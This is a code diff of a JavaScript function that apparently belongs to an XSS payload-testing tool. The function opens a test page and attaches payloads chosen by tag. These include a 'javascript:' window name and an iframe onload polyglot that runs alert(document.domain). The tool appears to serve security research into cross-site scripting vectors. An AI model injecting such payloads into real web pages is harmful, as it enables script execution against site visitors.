@@ -18,15 +18,24 @@ for(const tag of Object.values(TAGS)){
 }
 
 function execute_payload(payload){
-    hash = `/*<iframe/onload="/*'/**/;alert(document.domain)//">`
+    
     let iframe = document.createElement('iframe');
-    let meta = ''
+    let meta = '';
+    let name = '';
+    let hash = '';
 
+
+    if(payload.tags.includes(TAGS.controlsName)){
+        name = 'javascript:alert(document.domain)//'
+    }
     if(payload.tags.includes(TAGS.inlineStyleBlock)) {
         meta += `<meta http-equiv="content-security-policy" content="style-src 'none'">`
     }
+    if(payload.tags.includes(TAGS.controlsURL)){
+        hash = `#/*<iframe/onload="/*'/**/;alert(document.domain)//">`
+    }
 
-    x = open(`https://terjanq.me/xss.php?html=${enc(meta)}${enc(payload.html)}#${hash}`, 'javascript:alert(document.domain)//')
+    x = open(`https://terjanq.me/xss.php?html=${enc(meta)}${enc(payload.html)}${hash}`, name)
 }
 
 function createPayloads(payloads){
